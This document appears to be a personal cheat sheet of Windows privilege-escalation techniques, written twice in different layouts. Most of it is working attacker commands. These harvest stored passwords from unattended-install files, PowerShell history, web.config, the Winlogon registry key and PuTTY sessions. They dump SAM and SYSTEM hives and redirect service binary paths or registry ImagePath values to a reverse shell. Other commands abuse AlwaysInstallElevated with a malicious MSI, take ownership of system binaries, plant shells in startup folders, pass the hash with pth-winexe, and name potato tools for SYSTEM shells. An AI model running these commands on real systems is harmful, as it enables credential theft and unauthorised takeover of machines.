# Looking for Passwords:
## unattended Windows Installations:
	+ C:\Unattend.xml
	+ C:\Windows\Panther\Unattend.xml
	+ C:\Windows\Panther\Unattend\Unattend.xml
	+ C:\Windows\system32\sysprep.inf
	+ C:\Windows\system32\sysprep\sysprep.xml
## Powershell History:
```ps1
type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```
## Stored Creds:
```ps1
# list the sotred credentials
cmdkey /list
# run command as another user:
runas /savecred /user:admin cmd.exe
```
## IIS Configurations:
```ps1
# looking for "web.config"
C:\inetpub\wwwroot\web.config
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
# quickly find database Creds:
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

## Retrieve Creds from "PuTTy"
```ps1
reg query HKEY_CURRENT_USER\Software\<creatorOFputty>\PuTTY\Sessions\ /f "Proxy" /s
```


# Scheduled Tasks:
```ps1
# list of Scheduled Tasks:
schtasks
# for more details on specific task:
schtasks /query /tn vulntask /fo list /v
# check permissions on its binary:
icacls c:\Path\to\executableFile
get-acl c:\Path\to\executableFile
```
# Always Install Elevated:
+ check registry:
	+ C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
	+ C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer	
+ install package from commandLine:
	+ C:\> msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi


# Services:
Windows services are managed by the **Service Control Manager (SCM)**. The SCM is a process in charge of **managing the state of services** as needed, checking the current status of any given service and generally providing a way to configure services.

### + check Insecure Permissions on Service Executable
	query on service to get information:
	```ps1
	# look for BINARY_PATH_NAME & SERVICE_START_NAME and check Binary for overwriting it
	C:\> sc qc apphostsvc
	# start & stop a service
	C:\> sc stop windowsscheduler
	C:\> sc start windowsscheduler
	```
	
### + Insecure Service Permissions: 	
there is a chance even if binary is well protected on DACL. we should check service DACL(not binary DACL)
```ps1
# check for service reconfiguration
accesschk64.exe -qlc VULNservice
# reconfigure the service to point to our executable. 
sc config VULNservice binPath= "C:\PATH\TO\reverseSHELL.exe" obj= LocalSystem
```

### + Unquoted Service Paths:
```ps1
# query the service and see if the executable path is unquoted (BINARY_PATH_NAME)
C:\> sc qc "vncserver"
```

### You can look for Services in Registry:
	 HKLM\SYSTEM\CurrentControlSet\Services\	
	
### + Know that: 
Services have a Discretionary Access Control List (DACL), which indicates who has permission to start, stop, pause, query status, query configuration, or reconfigure the service,


# Dangerous Tokens
find all the windows tokens with their meanings [Here](https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants), find more about hot to exploit it [here](https://github.com/gtworek/Priv2Admin)

## SeBackup / SeRestore:
The SeBackup and SeRestore privileges allow users to read and write to any file in the system, ignoring any DACL in place. attacker can copy the SAM and SYSTEM registry hives to extract the local Administrator's password hash.
- backup SAM and SYSTEM hashes:
	```ps1
	reg save hklm\system C:\anywhere\system.hive
	reg save hklm\sam C:\anywhere\sam.hive
	```


## SeTakeOwnership:	
The SeTakeOwnership privilege allows a user to take ownership of any object on the system, including files and registry keys. search for a service running as SYSTEM and take ownership of the service's executable.Notice that being the owner of a file doesn't necessarily mean that you have privileges over it, but being the owner you can assign yourself any privileges you need
```ps1
# take the executable ownership whit this:
takeown /f C:\Windows\System32\SomeThing.exe
# give your user full permissions, After this, we will replace the Binary:
icacls C:\Windows\System32\SomeThing.exe /grant <Username>:F
```

## SeImpersonate / SeAssignPrimaryToken:
lets keep it short:)))). use this binaries to get systemSHELL:
- RoguePotato.exe
- juicyPotato.exe
- PrintSpoofer.exe

# Vulnerable Softwares
## Unpatched Software:
Software installed on the target system can present various privilege escalation opportunities. check for installed softwares and versions:
Remember that the wmic product command may not return all installed programs.It is always worth checking desktop shortcuts, available services or generally any trace that indicates the existence of additional software that might be vulnerable.
```ps1
wmic product get name,version,vendor
```
	
	
# version2

# windows service Enumerations for privEsc: 
	
	NOTE: in most of the cases we only want to replace service binary with our reverse-shell.exe. so, we look for binary path in any way we can to do this
	NOTE: Download this Binary: accesschk.exe. this helps you better enumerate file and directory permissions on that system.
	NOTE: after replacing the service binary YOU SHOULD BE ABLE TO RESTART THE TARGET SERVICE

## Services

	1- first of all we can use this command to take a look at the service: 
		
		"cmd.exe /c sc qc <serviceName>"



	2- Insecure Service Permissions: try to set binpath in target service-configuration(note: changing binaryPath):
		
		+ sc config <serviceName> binpath=<Path-to-reverseShell>
		
		+ check for this ability: .\accesschk.exe /accepteula -uwcqv <username> <service-name>


	3- Unquoted path file: try to create reverse_shell filename similar to folder-names. in case that you have write permissions

		+ check if we can write to where we want: .\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"



	4- Weak Registry Permissions:   			

		+ check if we can write to service's registry: .\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\<Service-name>

		+ overwrite binaryPath in registry: reg add HKLM\SYSTEM\CurrentControlSet\services\<Service-name> /v ImagePath /t REG_EXPAND_SZ /d <reverse-shell path> /f

					
	5- permission to write on actual service's executable file.

		+ check: .\accesschk.exe /accepteula -quvw "C:\Program Files\<path-to-executable-file-for-servcie>.exe"


## Registry


	1- AutoRun applications Registry: 

			NOTE: look for registry-key for autoRun applications. then find the executable location.

			+ the following registry-key tell the system to run this executable every time that user logs on: 
			
				+ Registry:  	HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run 
						HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run 
			+ Query: 
				+ reg query <Registry name>
					
			+ check permissions: .\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"




	2- Always Install Elevated Registry:

		   NOTE: if the values for the following registries are '1', then a low privileged user can install programs with administrator privileges.

			+ Registry: 	HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
					HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer			
		
		+ Query: 
			+ reg query <Registry name> /v AlwaysInstallElevated



	3- Stored password in Registry:

		NOTE: navigate to HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon and scroll down to "DefaultPassword." When you double-click on that, a window should pop up that reveals the stored password

			+ Registry: HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon

		+ Query: 
			+ reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
			+ reg query HKLM /f password /t REG_SZ /s


## scheduled tasks:
	+ needless to say that if you have permissions to change the contents of the scheduled scripts that are running with administration privileges, you can gain a reverse shell.


## StartUp Applications: 

	+ StartUP Application: check if you have permission to put any shortcuts at the following path. if you have, so you can put your shell code to be executed by the system at startUP.

		Path: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp

		Note: be aware that there is a another startup foder for a specific user in the following. dont put your shell in here. its useless:
			+ C:\Users\Username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup.

		Check: .\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"


		win + ctl and open run: 
			goto this users's startup folder: "shell:startup"
			goto AllUsers's startup folder: "shell:common startup



## unsecure GUI with system priv:
	+ if any GUI application running with admin rights, has "file open" option, we can spawn cmd.exe as admin.



## stored passwords:

	+ 1 stored credentilas from another users (maybe admin):

		NOTE: make sure you updated the stored credentials, otherwise you will see nothing by this command.
		+ Enumerate stored Credentials: cmdkey /list


		NOTE: Allows a user to run specific tools and programs with different permissions than the user's current logon provides.
		+ command: runas /savecred /user:admin C:\<path-to-binaryFile>.exe



	+ 2 Stealing SAM database: maybe there is a SAM backup


	+ 3 PASS THE HASH: to run binaries with pass the hash you need to run: pth-winexe -U 'admin%NTLM-hash' //<target local-IP> cmd.exe
  
  
  
## Token Impersonation:

	+ fairly hard to Describe :)))))
	- 1 check if you have this specific token: 
		command: whoami /priv
		Note: you should look for : SeImpersonatePrivilege
	- 2 use this tools to gain "NT Authority/System" shell:
		+ Rugue potato 
		+ prinSpoofer
  






